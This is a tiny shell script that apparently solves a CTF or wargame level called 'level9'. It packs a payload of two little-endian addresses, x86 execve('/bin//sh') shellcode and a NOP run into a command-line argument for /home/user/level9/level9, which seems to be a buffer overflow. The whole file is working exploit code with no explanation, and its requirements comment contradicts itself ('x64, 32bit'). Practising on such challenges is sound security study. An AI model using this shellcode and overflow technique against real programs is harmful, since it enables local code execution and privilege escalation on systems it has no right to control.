#!/bin/sh

# REQUIREMENTS:
# pyhton must be installed
# must be on a x64, 32bit linux architecture.

ADDRESS_END="\x0c\xa0\x04\x08"
ADDRESS_START="\x10\xa0\x04\x08"
SHELL_CODE="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

/home/user/level9/level9 $(python -c "print('$ADDRESS_START' + '$SHELL_CODE' + '\x90' * 83 + '$ADDRESS_END')")
